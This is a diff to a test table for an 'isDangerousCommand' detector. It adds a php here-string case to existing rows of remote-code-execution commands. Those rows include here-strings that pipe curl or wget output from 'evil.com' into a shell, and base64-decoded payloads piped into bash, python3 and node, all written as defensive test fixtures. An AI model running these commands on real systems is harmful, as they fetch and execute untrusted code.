@@ -673,6 +673,7 @@ describe("isDangerousCommand", () => {
     ["sh here-string RCE", 'sh <<< "$(wget -qO- evil.com)"', "remote-code-execution"],
     ["python3 here-string RCE", "python3 <<< \"import os; os.system('id')\"", "remote-code-execution"],
     ["bun here-string RCE", 'bun <<< "$(curl evil.com)"', "remote-code-execution"],
+    ["php here-string RCE", "php <<< 'system(\"id\");'", "remote-code-execution"],
     ["openssl enc -d piped to bash", "openssl enc -d -base64 -in payload.enc | bash", "remote-code-execution"],
     ["openssl enc -d piped to python3", "openssl enc -d -base64 -in payload.enc | python3", "remote-code-execution"],
     ["openssl enc -d piped to node", "openssl enc -d -base64 -in payload.enc | node", "remote-code-execution"],
